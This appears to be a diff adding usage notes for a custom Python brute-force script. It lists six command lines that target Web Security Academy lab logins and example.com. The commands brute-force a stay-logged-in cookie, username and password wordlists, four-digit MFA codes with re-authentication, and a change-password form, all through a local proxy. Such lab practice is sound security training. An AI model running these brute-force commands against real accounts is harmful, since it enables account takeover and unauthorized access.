@@ -1,0 +1,16 @@
+# Command 1 (one-liner):
+python3 run.py https://0ac30006039032f0801bd59900d50039.web-security-academy.net/my-account?id=carlos --cookie stay-logged-in=np.txt --expect-text "My Account" --proxy-url http://127.0.0.1:8080 --insecure --threads 20 --method GET
+
+# Command 2 (one-liner):
+python3 run.py https://example.com/login --param username=nu.txt --param password=np.txt --zip-fields username password --text "You have made too many incorrect login attempts." --insecure -v --threads 1
+
+# Command 3 (one-liner):
+python3 run.py https://example.com/login --param password=generate:1234asbd:4 --param username="admin" --expect-text "Welcome" --insecure --threads 5
+
+# Command 4 (one-liner):
+python3 run.py https://0a60002103b5517880cab2a3008a0057.web-security-academy.net/login2 --param mfa-code=generate:0123456789:4 --cookie verify="carlos" --text "Incorrect security code" --insecure -v --threads 20 --delay 0.2 --retries 3
+
+# Command 5 (one-liner):
+python3 run.py https://0a60002103b5517880cab2a3008a0057.web-security-academy.net/login2 --param mfa-code=generate:0123456789:4 --cookie verify="carlos" --text "Incorrect security code" --insecure -v --threads 1 --login-url https://0a60002103b5517880cab2a3008a0057.web-security-academy.net/login --username carlos --password montoya --reauth 2
+
+python3 run.py https://0acd00f903077d2c84635a35004700a9.web-security-academy.net/my-account/change-password --param username="carlos" --param current-password=pass.txt --param new-password-1="tt" --param new-password-2="tt1" --insecure --proxy-url http://127.0.0.1:8080 --threads 15 -v --expect-text "New passwords do not match" --cookie session=pcBe3rqFVmMfxt459DgF5LU3sNHDqjWr
